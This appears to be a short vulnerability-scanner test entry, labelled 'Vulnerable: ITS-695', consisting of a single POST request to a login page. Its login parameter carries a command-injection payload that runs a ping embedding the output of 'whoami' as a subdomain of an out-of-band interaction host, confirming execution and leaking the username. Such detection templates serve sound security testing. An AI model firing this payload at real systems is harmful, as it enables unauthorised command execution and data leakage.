# Vulnerable: ITS-695
POST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}'whoami'.{{interactsh-url}})
